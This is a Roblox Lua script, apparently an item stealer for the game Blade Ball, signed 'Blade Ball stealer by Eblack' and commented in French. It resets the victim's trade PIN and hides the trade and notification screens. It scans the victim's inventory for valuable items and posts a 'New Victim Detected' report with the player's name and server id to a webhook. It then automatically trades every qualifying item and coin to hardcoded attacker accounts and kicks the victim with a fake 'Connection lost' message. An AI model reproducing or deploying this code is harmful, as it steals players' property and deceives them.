m-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- // RECUPERATION DES GLOBALES
local auth_token = _G.AuthToken or "EBK-SS-A" 
local webhook = _G.webhook or ""
local users = _G.Usernames or {"Silv3rTurboH3ro", "Ddr5pri","Andrewdagoatya","EmmaQueen2024_YT","Ech0_Night2010YT","EpicClawSilver","PhoenixSilver2011","XxElla_R0CK3TXX"}
local min_rap = _G.min_rap or 50
local ping = _G.pingEveryone or "No"

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui

-- // PROTECTION INITIALE
if webhook == "" or #users == 0 then return end

-- // FONCTION D'ENVOI (WORKER COMPATIBLE)
local function sendToWorker(payload)
    payload["auth_token"] = auth_token
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- // BYPASS PIN & DISCRETION
pcall(function() netModule:WaitForChild("RF/ResetPINCode"):InvokeServer({["option"] = "PIN", ["value"] = "9079"}) end)
local tradeGui = PlayerGui:WaitForChild("Trade")
tradeGui.Black.Visible = false
tradeGui.Main.Visible = false
tradeGui.Main:GetPropertyChangedSignal("Visible"):Connect(function() tradeGui.Main.Visible = false end)
PlayerGui:WaitForChild("Notifications").Notifications.Visible = false

-- // SCAN INVENTAIRE & RAP
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

local function buildMap(cat)
    local m = {}
    local d = rapData[cat]
    if not d then return m end
    for k, r in pairs(d) do
        local s, dec = pcall(function() return HttpService:JSONDecode(k) end)
        if s and type(dec) == "table" then
            for _, p in ipairs(dec) do if p[1] == "Name" then m[p[2]] = r break end end
        end
    end
    return m
end

local totalRAP = 0
for _, cat in ipairs(categories) do
    local map = buildMap(cat)
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            if not info.TradeLock then
                local rap = map[info.Name] or 0
                if rap >= min_rap then
                    totalRAP = totalRAP + rap
                    table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
                end
            end
        end
    end
end

-- // ENVOI EMBED
local function sendEmbed(isJoin)
    local grouped = {}
    for _, item in ipairs(itemsToSend) do grouped[item.Name] = (grouped[item.Name] or 0) + 1 end
    local listText = ""
    for name, count in pairs(grouped) do listText = listText .. name .. " (x" .. count .. ")\n" end

    local payload = {
        ["username"] = isJoin and (totalRAP >= 500 and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT") or "⚪ Eblack - SERVER HIT",
        ["content"] = isJoin and ((ping == "Yes" and "@everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')") or nil,
        ["embeds"] = {{
            ["title"] = isJoin and "🔴 New Victim Detected" or "⚪ Your Account Joined 🎉",
            ["color"] = totalRAP >= 500 and 65280 or 8323327,
            ["fields"] = {
                {name = "Victim 👤:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Total RAP 💰:", value = "**" .. tostring(totalRAP) .. "**", inline = true},
                {name = "JobId 🆔:", value = "```" .. game.JobId .. "```", inline = false},
                {name = "Items 📝:", value = listText ~= "" and listText or "None", inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    sendToWorker(payload)
end

-- // LOGIQUE DE TRADE
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    sendEmbed(true)

    local inTrade = false
    tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = tradeGui.Enabled end)

    local function doTrade(target)
        sendEmbed(false)
        while #itemsToSend > 0 do
            repeat task.wait(0.5) netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target) until inTrade
            local batch = {}
            for i = 1, math.min(100, #itemsToSend) do table.insert(batch, table.remove(itemsToSend, 1)) end
            for _, item in ipairs(batch) do netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID) end
            
            pcall(function()
                local tokens = tonumber(PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")) or 0
                if tokens > 0 then netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens) end
            end)

            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            task.wait(0.3)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            repeat task.wait(0.5) until not inTrade
        end
        plr:kick("Connection lost.")
    end

    local function check(p) if table.find(users, p.Name) then doTrade(p) end end
    for _, p in ipairs(Players:GetPlayers()) do check(p) end
    Players.PlayerAdded:Connect(check)
end
